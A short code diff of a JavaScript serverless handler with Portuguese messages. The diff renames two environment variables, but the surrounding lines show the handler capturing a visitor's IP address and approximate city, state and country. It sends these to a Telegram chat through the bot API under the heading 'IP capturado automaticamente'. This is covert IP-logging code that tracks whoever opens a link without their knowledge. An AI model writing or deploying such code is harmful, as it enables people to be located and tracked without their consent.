@@ -7,8 +7,8 @@ export default async function handler(req, res) {
 
   const mensagem = `📡 IP capturado automaticamente:\n\n🌐 IP: ${ip}\n🏙️ Local aproximado: ${cidade} - ${estado} - ${pais}\n🕒 Hora: ${new Date().toLocaleString("pt-BR")}`;
 
-  const botToken = process.env.BOTTOKEN;
-  const chatId = process.env.CHATID;
+  const botToken = process.env.BOT_TOKEN;
+  const chatId = process.env.CHAT_ID;
 
   try {
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
